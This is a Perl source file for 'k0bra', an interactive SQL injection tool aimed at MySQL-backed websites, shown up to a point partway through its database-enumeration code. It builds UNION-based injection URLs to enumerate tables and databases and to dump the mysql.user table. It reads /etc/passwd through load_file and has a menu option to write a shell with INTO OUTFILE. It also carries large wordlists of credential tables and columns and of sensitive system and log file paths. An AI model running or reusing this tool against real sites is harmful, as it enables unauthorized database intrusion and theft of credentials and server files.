#!usr/bin/perl
#k0bra 0.5
#Automatic SQL Scanner for MYSQL
#(c)0ded By Doddy H
#
#
#C:\Users\DoddyH>perl k0bra.pl http://127.0.0.1/sql.php?id= --
#
#
#
#
# @      @@   @
#@@     @  @ @@
# @ @@  @  @  @ @   @ @ @@@
# @ @   @  @  @@ @ @@@ @  @
# @@    @  @  @  @  @   @@@
# @ @   @  @  @  @  @  @  @
#@@@ @   @@   @@@  @@@ @@@@@
#
#
#
#
#[Status] : Scanning.....
#[Status] : Enjoy the menu
#
#[Target confirmed] : http://127.0.0.1/sql.php?id=-1+union+select+hackman,2,3
#[Bypass] : --
#
#
#
#--== information_schema.tables ==--
#
#[1] : Show tables
#[2] : Show columns
#[3] : Show DBS
#[4] : Show tables witg other DB
#[5] : Show columns with other DB
#
#
#--== mysql.user ==--
#
#[6] : Show users
#
#
#--== Others ==--
#
#[7] : Fuzzing tables
#[8] : Fuzzing columns
#[9] : Fuzzing files with load_file
#[10] : Dump
#[11] : Informacion of the server
#[12] : Create a shell with into outfile
#[13] : Show Log
#[14] : Exit
#
#
#[Option] : Enjoy this program xDDDDD
#
 
system('cls');
system ("title k0bra");



@buscar1 =('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario','web_users','name','names','nombre','nombres','usuarios','member','members','admin_table','usuaris','web_usuarios','miembro','miembros','membername','admins','administrator','sign','config','USUARIS','cms_operadores','administrators','passwd','password','passwords','pass','Pass','mpn_authors','author','musuario','mysql.user','user_names','foro','tAdmin','tadmin','user_password','user_passwords','user_name','member_password','mods','mod','moderators','moderator','user_email','jos_users','mb_user','host','apellido_nombre','user_emails','user_mail','user_mails','mail','emails','email','address','jos_usuarios','tutorial_user_auth','e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','tbl_usuarios','user_auth','login_radio','registers','register','usr','usrs','ps','pw','un','u_name','u_pass','tbl_admin','usuarios_head','tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','BG_CMS_Users','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id','foro_usuarios','cliente','sistema_usuario','sistema_password','contrasena','auth','key','senha','signin','dir_admin','alias','clientes','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member','calendar_users','cursos','tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','curso','membros','utilizadores','staff','nuke_authors','accounts','account','accnts','signup','leads','lead','associated','accnt','customers','customer','membres','administrateur','utilisateur','riacms_users','tuser','tusers','utilisateurs','amministratore','god','God','authors','wp_users','tb_usuarios','asociado','asociados','autores','autor','Users','Admin','Members','tb_usuario','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO','USR_NAME','about','access','admin_id','admin_name','admin_pass','admin_passwd','admin_password','admin_pwd','admin_user','admin_userid','admin_username','adminemail','adminid','administrator_name','adminlogin','adminmail','adminname','adminuser','adminuserid','adminusername','aid','aim','apwd','auid','authenticate','authentication','blog','cc_expires','cc_number','cc_owner','cc_type','cfg','cid','clientname','clientpassword','clientusername','conf','contact','converge_pass_hash','converge_pass_salt','crack','customers_email_address','customers_password','cvvnumber]','data','db_database_name','db_hostname','db_password','db_username','download','e_mail','emer','emni','emniplote','emri','fjalekalimi','fjalekalimin','full','gid','group','group_name','hash','hashsalt','homepage','icq','icq_number','id','id_group','id_member','images','ime','index','ip_address','kodi','korisnici','korisnik','kpro_user','last_ip','last_login','lastname','llogaria','login_admin','login_name','login_pass','login_passwd','login_password','login_pw','login_pwd','login_user','login_username','logini','loginkey','loginout','logo','logohu','lozinka','md5hash','mem_login','mem_pass','mem_passwd','mem_password','mem_pwd','member_id','member_login_key','member_name','memberid','memlogin','mempassword','my_email','my_name','my_password','my_username','myname','mypassword','myusername','nc','new','news','number','nummer','p_assword','p_word','pass_hash','pass_w','pass_word','pass1word','passw','passwordsalt','passwort','passwrd','perdorimi','perdoruesi','personal_key','phone','privacy','psw','punetoret','punonjes','pword','pwrd','salt','search','secretanswer','secretquestion','serial','session_member_id','session_member_login_key','sesskey','setting','sid','sifra','spacer','status','store','store1','store2','store3','store4','table_prefix','temp_pass','temp_password','temppass','temppasword','text','uid','uname','user_admin','user_icq','user_id','user_ip','user_level','user_login','user_n','user_pass','user_passw','user_passwd','user_pw','user_pwd','user_pword','user_pwrd','user_un','user_uname','user_username','user_usernm','user_usernun','user_usrnm','user1','useradmin','userid','userip','userlogin','usern','usernm','userpass','userpassword','userpw','userpwd','usr_n','usr_name','usr_pass','usr2','usrn','usrnam','usrname','usrnm','usrpass','warez','xar_name','xar_pass','nom dutilisateur','mot de passe','compte','comptes','aide','objectif','authentifier','authentification','Contact','fissure','client','clients','de donn?es','mot_de_passe_bdd','t?l?charger','E-mail','adresse e-mail','Emer','complet','groupe','hachage','Page daccueil','Kodi','nom','connexion','membre','MEMBERNAME','mon_mot_de_passe','monmotdepasse','ignatiusj','caroline-du-nord','nouveau','Nick','passer','Passw','Mot de passe','t?l?phone','protection de la vie priv?e','PSW','pWord','sel','recherche','de s?rie','param?tre','?tat','stocker','texte','cvvnumber');

@buscar2 = ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email','senha','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail','cliente','usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','host','pws','cedula','userName','host_password','chave','alias','apellido_nombre','cliente_nombre','cliente_email','cliente_pass','cliente_user','cliente_usuario','login_id','sistema_id','author','user_login','admin_user','admin_pass','uh_usuario','uh_password','psw','host_username','sistema_usuario','auth','key','usuarios_nombre','usuarios_nick','usuarios_password','user_clave','membername','nme','unme','password','user_password','autores','pass_hash','hash','pass','correo','usuario_nombre','usuario_nick','usuario_password','userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors','user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username','tbladmins','sort','_wfspro_admin','4images_users','a_admin','account','accounts','adm','admin','admin_login','admin_userinfo','administer','administrable','administrate','administration','administrator','administrators','adminrights','admins','adminuser','art','article_admin','articles','artikel','ÃÜÂë','aut','autore','backend','backend_users','backenduser','bbs','book','chat_config','chat_messages','chat_users','client','clients','clubconfig','company','config','contact','contacts','content','control','cpg_config','cpg132_users','customer','customers','customers_basket','dbadmins','dealer','dealers','diary','download','Dragon_users','e107.e107_user','e107_user','forum.ibf_members','fusion_user_groups','fusion_users','group','groups','ibf_admin_sessions','ibf_conf_settings','ibf_members','ibf_members_converge','ibf_sessions','icq','images','index','info','ipb.ibf_members','ipb_sessions','joomla_users','jos_blastchatc_users','jos_comprofiler_members','jos_contact_details','jos_joomblog_users','jos_messages_cfg','jos_moschat_users','jos_users','knews_lostpass','korisnici','kpro_adminlogs','kpro_user','links','login_admin','login_admins','login_user','login_users','logins','logs','lost_pass','lost_passwords','lostpass','lostpasswords','m_admin','main','mambo_session','mambo_users','manage','manager','mb_users','member','memberlist','members','minibbtable_users','mitglieder','movie','movies','mybb_users','mysql','mysql.user','names','news','news_lostpass','newsletter','nuke_authors','nuke_bbconfig','nuke_config','nuke_popsettings','nuke_users','ÓÃ»§','obb_profiles','order','orders','parol','partner','partners','passes','passwords','perdorues','perdoruesit','phorum_session','phorum_user','phorum_users','phpads_clients','phpads_config','phpbb_users','phpBB2.forum_users','phpBB2.phpbb_users','phpmyadmin.pma_table_info','pma_table_info','poll_user','punbb_users','pwds','reg_user','reg_users','registered','reguser','regusers','session','sessions','settings','shop.cards','shop.orders','site_login','site_logins','sitelogin','sitelogins','sites','smallnuke_members','smf_members','SS_orders','statistics','superuser','sysadmins','system','sysuser','sysusers','table','tables','tb_admin','tb_administrator','tb_login','tb_member','tb_members','tb_user','tb_username','tb_usernames','tb_users','tbl','tbl_user','tbl_users','tbluser','tbl_clients','tbl_client','tblclients','tblclient','test','usebb_members','user_admin','user_info','user_list','user_logins','user_names','usercontrol','userinfo','userlist','userlogins','usernames','userrights','users','vb_user','vbulletin_session','vbulletin_user','voodoo_members','webadmin','webadmins','webmaster','webmasters','webuser','webusers','x_admin','xar_roles','xoops_bannerclient','xoops_users','yabb_settings','yabbse_settings','ACT_INFO','ActiveDataFeed','Category','CategoryGroup','ChicksPass','ClickTrack','Country','CountryCodes1','CustomNav','DataFeedPerformance1','DataFeedPerformance2','DataFeedPerformance2_incoming','DataFeedShowtag1','DataFeedShowtag2','DataFeedShowtag2_incoming','dtproperties','Event','Event_backup','Event_Category','EventRedirect','Events_new','Genre','JamPass','MyTicketek','MyTicketekArchive','News','PerfPassword','PerfPasswordAllSelected','Promotion','ProxyDataFeedPerformance','ProxyDataFeedShowtag','ProxyPriceInfo','Region','SearchOptions','Series','Sheldonshows','StateList','States','SubCategory','Subjects','Survey','SurveyAnswer','SurveyAnswerOpen','SurveyQuestion','SurveyRespondent','sysconstraints','syssegments','tblRestrictedPasswords','tblRestrictedShows','TimeDiff','Titles','ToPacmail1','ToPacmail2','UserPreferences','uvw_Category','uvw_Pref','uvw_Preferences','Venue','venues','VenuesNew','X_3945','tblArtistCategory','tblArtists','tblConfigs','tblLayouts','tblLogBookAuthor','tblLogBookEntry','tblLogBookImages','tblLogBookImport','tblLogBookUser','tblMails','tblNewCategory','tblNews','tblOrders','tblStoneCategory','tblStones','tblUser','tblWishList','VIEW1','viewLogBookEntry','viewStoneArtist','vwListAllAvailable','CC_info','CC_username','cms_user','cms_users','cms_admin','cms_admins','jos_user','table_user','bulletin','cc_info','login_name','admuserinfo','userlistuser_list','SiteLogin','Site_Login','UserAdmin','Admins','Login','Logins');


@buscar3 =('c:/xampp/log.txt','../../../boot.ini','../../../../boot.ini','../../../../../boot.ini','../../../../../../boot.ini','/etc/passwd','/etc/shadow','/etc/shadow~','/etc/hosts','/etc/motd','/etc/apache/apache.conf','/etc/fstab','/etc/apache2/apache2.conf','/etc/apache/httpd.conf','/etc/httpd/conf/httpd.conf','/etc/apache2/httpd.conf','/etc/apache2/sites-available/default','/etc/mysql/my.cnf','/etc/my.cnf','/etc/sysconfig/network-scripts/ifcfg-eth0','/etc/redhat-release','/etc/httpd/conf.d/php.conf','/etc/pam.d/proftpd','/etc/phpmyadmin/config.inc.php','/var/www/config.php','/etc/httpd/logs/error_log','/etc/httpd/logs/error.log','/etc/httpd/logs/access_log','/etc/httpd/logs/access.log','/var/log/apache/error_log','/var/log/apache/error.log','/var/log/apache/access_log','/var/log/apache/access.log','/var/log/apache2/error_log','/var/log/apache2/error.log','/var/log/apache2/access_log','/var/log/apache2/access.log','/var/www/logs/error_log','/var/www/logs/error.log','/var/www/logs/access_log','/var/www/logs/access.log','/usr/local/apache/logs/error_log','/usr/local/apache/logs/error.log','/usr/local/apache/logs/access_log','/usr/local/apache/logs/access.log','/var/log/error_log','/var/log/error.log','/var/log/access_log','/var/log/access.log','/etc/group','/etc/security/group','/etc/security/passwd','/etc/security/user','/etc/security/environ','/etc/security/limits','/usr/lib/security/mkuser.default','/apache/logs/access.log','/apache/logs/error.log','/etc/httpd/logs/acces_log','/etc/httpd/logs/acces.log','/var/log/httpd/access_log','/var/log/httpd/error_log','/apache2/logs/error.log','/apache2/logs/access.log','/logs/error.log','/logs/access.log','/usr/local/apache2/logs/access_log','/usr/local/apache2/logs/access.log','/usr/local/apache2/logs/error_log','/usr/local/apache2/logs/error.log','/var/log/httpd/access.log','/var/log/httpd/error.log','/opt/lampp/logs/access_log','/opt/lampp/logs/error_log','/opt/xampp/logs/access_log','/opt/xampp/logs/error_log','/opt/lampp/logs/access.log','/opt/lampp/logs/error.log','/opt/xampp/logs/access.log','/opt/xampp/logs/error.log','C:\ProgramFiles\ApacheGroup\Apache\logs\access.log','C:\ProgramFiles\ApacheGroup\Apache\logs\error.log','/usr/local/apache/conf/httpd.conf','/usr/local/apache2/conf/httpd.conf','/etc/apache/conf/httpd.conf','/usr/local/etc/apache/conf/httpd.conf','/usr/local/apache/httpd.conf','/usr/local/apache2/httpd.conf','/usr/local/httpd/conf/httpd.conf','/usr/local/etc/apache2/conf/httpd.conf','/usr/local/etc/httpd/conf/httpd.conf','/usr/apache2/conf/httpd.conf','/usr/apache/conf/httpd.conf','/usr/local/apps/apache2/conf/httpd.conf','/usr/local/apps/apache/conf/httpd.conf','/etc/apache2/conf/httpd.conf','/etc/http/conf/httpd.conf','/etc/httpd/httpd.conf','/etc/http/httpd.conf','/etc/httpd.conf','/opt/apache/conf/httpd.conf','/opt/apache2/conf/httpd.conf','/var/www/conf/httpd.conf','/private/etc/httpd/httpd.conf','/private/etc/httpd/httpd.conf.default','/Volumes/webBackup/opt/apache2/conf/httpd.conf','/Volumes/webBackup/private/etc/httpd/httpd.conf','/Volumes/webBackup/private/etc/httpd/httpd.conf.default','C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf','C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf','C:\ProgramFiles\xampp\apache\conf\httpd.conf','/usr/local/php/httpd.conf.php','/usr/local/php4/httpd.conf.php','/usr/local/php5/httpd.conf.php','/usr/local/php/httpd.conf','/usr/local/php4/httpd.conf','/usr/local/php5/httpd.conf','/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf','/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf','/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf','/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php','/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php','/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php','/usr/local/etc/apache/vhosts.conf','/etc/php.ini','/bin/php.ini','/etc/httpd/php.ini','/usr/lib/php.ini','/usr/lib/php/php.ini','/usr/local/etc/php.ini','/usr/local/lib/php.ini','/usr/local/php/lib/php.ini','/usr/local/php4/lib/php.ini','/usr/local/php5/lib/php.ini','/usr/local/apache/conf/php.ini','/etc/php4.4/fcgi/php.ini','/etc/php4/apache/php.ini','/etc/php4/apache2/php.ini','/etc/php5/apache/php.ini','/etc/php5/apache2/php.ini','/etc/php/php.ini','/etc/php/php4/php.ini','/etc/php/apache/php.ini','/etc/php/apache2/php.ini','/web/conf/php.ini','/usr/local/Zend/etc/php.ini','/opt/xampp/etc/php.ini','/var/local/www/conf/php.ini','/etc/php/cgi/php.ini','/etc/php4/cgi/php.ini','/etc/php5/cgi/php.ini','c:\php5\php.ini','c:\php4\php.ini','c:\php\php.ini','c:\PHP\php.ini','c:\WINDOWS\php.ini','c:\WINNT\php.ini','c:\apache\php\php.ini','c:\xampp\apache\bin\php.ini','c:\NetServer\bin\stable\apache\php.ini','c:\home2\bin\stable\apache\php.ini','c:\home\bin\stable\apache\php.ini','/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini','/usr/local/cpanel/logs','/usr/local/cpanel/logs/stats_log','/usr/local/cpanel/logs/access_log','/usr/local/cpanel/logs/error_log','/usr/local/cpanel/logs/license_log','/usr/local/cpanel/logs/login_log','/var/cpanel/cpanel.config','/var/log/mysql/mysql-bin.log','/var/log/mysql.log','/var/log/mysqlderror.log','/var/log/mysql/mysql.log','/var/log/mysql/mysql-slow.log','/var/mysql.log','/var/lib/mysql/my.cnf','C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err','C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log','C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err','C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log','C:\ProgramFiles\MySQL\data\hostname.err','C:\ProgramFiles\MySQL\data\mysql.log','C:\ProgramFiles\MySQL\data\mysql.err','C:\ProgramFiles\MySQL\data\mysql-bin.log','C:\MySQL\data\hostname.err','C:\MySQL\data\mysql.log','C:\MySQL\data\mysql.err','C:\MySQL\data\mysql-bin.log','C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini','C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf','C:\ProgramFiles\MySQL\my.ini','C:\ProgramFiles\MySQL\my.cnf','C:\MySQL\my.ini','C:\MySQL\my.cnf','/etc/logrotate.d/proftpd','/www/logs/proftpd.system.log','/var/log/proftpd','/etc/proftp.conf','/etc/protpd/proftpd.conf','/etc/vhcs2/proftpd/proftpd.conf','/etc/proftpd/modules.conf','/var/log/vsftpd.log','/etc/vsftpd.chroot_list','/etc/logrotate.d/vsftpd.log','/etc/vsftpd/vsftpd.conf','/etc/vsftpd.conf','/etc/chrootUsers','/var/log/xferlog','/var/adm/log/xferlog','/etc/wu-ftpd/ftpaccess','/etc/wu-ftpd/ftphosts','/etc/wu-ftpd/ftpusers','/usr/sbin/pure-config.pl','/usr/etc/pure-ftpd.conf','/etc/pure-ftpd/pure-ftpd.conf','/usr/local/etc/pure-ftpd.conf','/usr/local/etc/pureftpd.pdb','/usr/local/pureftpd/etc/pureftpd.pdb','/usr/local/pureftpd/sbin/pure-config.pl','/usr/local/pureftpd/etc/pure-ftpd.conf','/etc/pure-ftpd/pure-ftpd.pdb','/etc/pureftpd.pdb','/etc/pureftpd.passwd','/etc/pure-ftpd/pureftpd.pdb','/var/log/pure-ftpd/pure-ftpd.log','/logs/pure-ftpd.log','/var/log/pureftpd.log','/var/log/ftp-proxy/ftp-proxy.log','/var/log/ftp-proxy','/var/log/ftplog','/etc/logrotate.d/ftp','/etc/ftpchroot','/etc/ftphosts','/var/log/exim_mainlog','/var/log/exim/mainlog','/var/log/maillog','/var/log/exim_paniclog','/var/log/exim/paniclog','/var/log/exim/rejectlog','/var/log/exim_rejectlog');

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common;
use URI::Split qw(uri_split);

my $nave = LWP::UserAgent->new();
$nave->timeout(5);
$nave->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12");

&head;
unless(@ARGV == 2) {
&menu;
} else {
&scan($ARGV[0],$ARVG[1]);
}
&finish;

sub menu {
print "[Page] : ";
chomp(my $page=<STDIN>);
print "\n[Bypass : -- /* %00] : ";
chomp(my $bypass = <STDIN>);
print "\n\n";
&scan($page,$bypass);
}

sub scan {
print "[Status] : Scanning.....\n";
$pass = &bypass($_[1]);
my ($scheme, $auth, $path, $query, $frag)  = uri_split($_[0]);
my $save = $auth;
if ($_[0]=~/hackman/ig) {
savefile($save.".txt","\n[Target Confirmed] : $_[0]\n");
&menu_options($_[0],$pass,$save);
}
my ($gen,$save,$control) = &length($_[0],$_[1]);
if ($control eq 1) {
print "[Status] : Enjoy the menu\n\n";
&menu_options($gen,$pass,$save);
} else {
print $control;
print "[Status] : Length columns not found\n\n";
<STDIN>;
&head;
&menu;
}
}

sub head {
system 'cls';
print qq(


 @      @@   @             
@@     @  @ @@             
 @ @@  @  @  @ @   @ @ @@@ 
 @ @   @  @  @@ @ @@@ @  @ 
 @@    @  @  @  @  @   @@@ 
 @ @   @  @  @  @  @  @  @ 
@@@ @   @@   @@@  @@@ @@@@@




);
}




sub copyright {
print "\n\n\n\n(C) Doddy Hackman 2010\n\n";
}


sub toma {
return $nave->request (GET $_[0])->content;
}


sub savefile {
open (SAVE,">>logs/webs/".$_[0]);
print SAVE $_[1]."\n";
close SAVE; 
}

sub finish {
print "\n\n\n(C) Doddy Hackman 2010\n\n";
<STDIN>;
exit(1);
}


sub length {
my $rows  = "0";
my $asc;
my $page = $_[0];
($pass1,$pass2) = &bypass($_[1]);
$inyection = $page."1".$pass1."and".$pass1."1=0".$pass1."order".$pass1."by"."9999999999".$pass2;
$code = toma($inyection);
if($code=~ /supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig || $code=~ /mysql_free_result/ig || $code =~ /mysql_fetch_assoc/ig ||$code =~ /mysql_num_rows/ig || $code =~ /mysql_fetch_array/ig || $code =~/mysql_fetch_assoc/ig || $code=~/mysql_query/ig || $code=~/mysql_free_result/ig || $code=~/equivocado en su sintax/ig || $code=~/You have an error in your SQL syntax/ig || $code=~/Call to undefined function/ig) {
$code1 = toma($page."1".$pass1."and".$pass1."1=0".$pass1."union".$pass1."select".$pass1."666".$pass2);
if ($code1=~/The used SELECT statements have a different number of columns/ig) {
my $patha = $1;
chomp $patha;
$alert = "char(".ascii("RATSXPDOWN1RATSXPDOWN").")";
$total = "1";
for my $rows(2..200) {
$asc.= ","."char(".ascii("RATSXPDOWN".$rows."RATSXPDOWN").")"; 
$total.= ",".$rows;
$injection = $page."1".$pass1."and".$pass1."1=0".$pass1."union".$pass1."select".$pass1.$alert.$asc;
$test = toma($injection);
if ($test=~/RATSXPDOWN/) {
@number = $test =~m{RATSXPDOWN(\d+)RATSXPDOWN}g;
$control = 1;
my ($scheme, $auth, $path, $query, $frag)  = uri_split($_[0]);
my $save = $auth;
savefile($save.".txt","\n[Target confirmed] : $page");
savefile($save.".txt","[Bypass] : $_[1]\n");
savefile($save.".txt","[Limit] : The site has $rows columns");
savefile($save.".txt","[Data] : The number @number print data");
if ($patha) {
savefile($save.".txt","[Full Path Discloure] : $patha");
}
$total=~s/$number[0]/hackman/;
savefile($save.".txt","[SQLI] : ".$page."1".$pass1."and".$pass1."1=0".$pass1."union".$pass1."select".$pass1.$total);
return($page."1".$pass1."and".$pass1."1=0".$pass1."union".$pass1."select".$pass1.$total,$save,$control);
}
}
}
}

sub bypass {
if ($_[0] eq "/*") { return ("/**/","/*"); }
elsif ($_[0] eq "%20") { return ("%20","%00"); }
else {return ("+","--");}}

sub ascii {
return join ',',unpack "U*",$_[0]; 
}

sub ascii_de {
$_[0] = join q[], map { chr } split q[,],$_[0];
return $_[0];
}

sub details {
my ($page,$bypass,$save) = @_;
($pass1,$pass2) = &bypass($bypass);
savefile($save.".txt","\n");
if ($page=~/(.*)hackman(.*)/ig) {
print "\n\n[+] Searching information..\n\n"; 
my  ($start,$end) = ($1,$2);
$inforschema = $start."unhex(hex(concat(char(69,82,84,79,82,56,53,52))))".$end.$pass1."from".$pass1."information_schema.tables".$pass2;
$mysqluser = $start."unhex(hex(concat(char(69,82,84,79,82,56,53,52))))".$end.$pass1."from".$pass1."mysql.user".$pass2;
$test3 = toma($start."unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))".$end.$pass2);
$test1 = toma($inforschema);
$test2 = toma($mysqluser);
if ($test2=~/ERTOR854/ig) {
savefile($save.".txt","[mysql.user] : ON");
print "[mysql.user] : ON\n";
} else {
print "[mysql.user] : OFF\n";
savefile($save.".txt","[mysql.user] : OFF");
}
if ($test1=~/ERTOR854/ig) {
print "[information_schema.tables] : ON\n";
savefile($save.".txt","[information_schema.tables] : ON");
} else {
print "[information_schema.tables] : OFF\n";
savefile($save.".txt","[information_schema.tables] : OFF");
}
if ($test3=~/ERTOR854/ig) {
print "[+] load_file permite ver los archivos\n";
savefile($save.".txt","[load_file] : ".$start."unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(0x2f6574632f706173737764))))".$end.$pass2);
}
$concat = "unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))"; 
$injection = $start.$concat.$end.$pass2;
$code = toma($injection);
if ($code=~/ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/g) {
print "\n[!] DB Version : $1\n[!] DB Name : $2\n[!] user_name : $3\n\n";
savefile($save.".txt","\n[!] DB Version : $1\n[!] DB Name : $2\n[!] user_name : $3\n");
} else {
print "\n[-] Not found any data\n";
}
}
}
}

sub menu_options {
print "[Target confirmed] : $_[0]\n";
print "[Bypass] : $_[1]\n\n";

my ($scheme, $auth, $path, $query, $frag)  = uri_split($_[0]);
my $save = $auth;
print "[save] : /logs/webs/$save\n\n";
print "\n\n--== information_schema.tables ==--\n\n";
print "[1] : Show tables\n";
print "[2] : Show columns\n";
print "[3] : Show DBS\n";
print "[4] : Show tables with other DB\n";
print "[5] : Show columns with other DB\n";
print "\n\n--== mysql.user ==--\n\n";
print "[6] : Show users\n";
print "\n\n--== Others ==--\n\n";
print "[7] : Fuzzing tables\n";
print "[8] : Fuzzing columns\n";
print "[9] : Fuzzing files with load_file\n";
print "[10] : Dump\n";
print "[11] : Informacion of the server\n";
print "[12] : Create a shell with into outfile\n";
print "[13] : Show Log\n";
print "[14] : Change Target\n";
print "[15] : Exit\n";
print "\n\n[Option] : ";
chomp(my $opcion = <STDIN>);
if ($opcion eq "1") {
schematables($_[0],$_[1],$save);
&reload;	
}
elsif ($opcion eq "2") {
print "\n\n[Tabla] : ";
chomp(my $tabla = <STDIN>);
schemacolumns($_[0],$_[1],$save,$tabla);
&reload;
}
elsif ($opcion eq "3") {
&schemadb($_[0],$_[1],$save);
&reload;
}
elsif ($opcion eq "4") {
print "\n\n[DAtabase] : ";
chomp(my $data =<STDIN>);
&schematablesdb($_[0],$_[1],$data,$save);
&reload;
}
elsif ($opcion eq "5"){
print "\n\n[DB] : ";
chomp(my $db =<STDIN>);
print "\n[Table] : ";
chomp(my $table =<STDIN>);
&schemacolumnsdb($_[0],$_[1],$db,$table,$save);
&reload;
}
elsif ($opcion eq "6") {
&mysqluser($_[0],$_[1],$save);
&reload;
}
elsif ($opcion eq "13") {
$t = "logs/webs/$save.txt";
system("start $t");
&reload;
}
elsif ($opcion eq "15") {
&finish;
}
elsif ($opcion eq "14") {
&head;
&menu;
}
elsif ($opcion eq "7") {
&tabfuzz($_[0],$_[1],$save);
&reload;
}
elsif ($opcion eq "8") {
print "\n\n[Tabla] : ";
chomp(my $tab  = <STDIN>);
&colfuzz($_[0],$_[1],$tab,$save);
&reload;
}
elsif ($opcion eq "9") {
&load($_[0],$_[1],$save);
&reload;
}
elsif ($opcion eq "10") {
print "\n\n[Table to dump] : ";
chomp(my $tabla = <STDIN>);
print "\n[Column 1] : ";
chomp(my $col1 = <STDIN>);
print "\n[Column 2] : ";
chomp(my $col2 = <STDIN>);
print "\n\n";
&dump($_[0],$col1,$col2,$tabla,$_[1],$save);
&reload;
}
elsif ($opcion eq "11") {
print "\n\n";
&details($_[0],$_[1],$save);
&reload;
}
elsif ($opcion eq "12") {
print "\n\n[Full Path Discloure] : ";
chomp(my $path = <STDIN>);
&into($_[0],$_[1],$path,$save);
&reload;
}
else {
&reload;
}
}

sub schematables {
$real = "1";
my ($page,$bypass,$save) = @_;
savefile($save.".txt","\n");
print "\n";
my $page1 = $page;
($pass1,$pass2) = &bypass($_[1]);
savefile($save.".txt","[DB] : default");
print "[+] Searching tables with schema\n\n";
$page =~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
$page1=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
$code = toma($page1.$pass1."from".$pass1."information_schema.tables".$pass2);
if ($code=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) { 
my $resto = $1;
$total = $resto - 17; 
print "[+] Tables Length :  $total\n\n";
savefile($save.".txt","[+] Searching tables with schema\n");
savefile($save.".txt","[+] Tables Length :  $total\n");
my $limit = $1;
for my $limit(17..$limit) {
$code1 = toma($page.$pass1."from".$pass1."information_schema.tables".$pass1."limit".$pass1.$limit.",1".$pass2);
if ($code1 =~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {
my $table = $1;
chomp $table;
print "[Table $real Found : $table ]\n";
savefile($save.".txt","[Table $real Found : $table ]");
$real++;
}}
} else {
print "\n[-] information_schema = ERROR\n";
}	 
}
sub reload {
print "\n\n[+] Finish\n\n";
<STDIN>;
&head;
&menu_options;
}


sub schemacolumns {
my ($page,$bypass,$save,$table) = @_;
my $page3 = $page;
my $page4 = $page;
savefile($save.".txt","\n");
print "\n";
($pass1,$pass2) = &bypass($bypass);
print "\n[DB] : default\n";
savefile($save.".txt","[DB] : default");
savefile($save.".txt","[Table] : $table\n");
$page3=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
$code3 = toma($page3.$pass1."from".$pass1."information_schema.columns".$pass1."where".$pass1."table_name=char(".ascii($table).")".$pass2);
if ($code3=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {
print "\n[Columns Length : $1 ]\n\n";
savefile($save.".txt","[Columns Length : $1 ]\n");
my $si = $1;
chomp $si;
$page4=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))/;
$real = "1";
for my $limit2(0..$si) {
$code4 = toma($page4.$pass1."from".$pass1."information_schema.columns".$pass1."where".$pass1."table_name=char(".ascii($table).")".$pass1."limit".$pass1.$limit2.",1".$pass2);
if ($code4=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) { 
print "[Column $real] : $1\n"; 
savefile($save.".txt","[Column $real] : $1");
$real++;
}}
} else {
print "\n[-] information_schema = ERROR\n";
}}

sub schemadb {
my ($page,$bypass,$save) = @_;
my $page1 = $page;
savefile($save.".txt","\n");
print "\n\n[+] Searching DBS\n\n";
($pass1,$pass2) = &bypass($bypass);
$page=~s/hackman/unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))/;
$code = toma($page.$pass1."from".$pass1."information_schema.schemata");
if ($code=~/RATSXPDOWN1(.*)RATSXPDOWN1/ig) {
my $limita = $1;
print "[+] Databases Length : $limita\n\n";
savefile($save.".txt","[+] Databases Length : $limita\n");
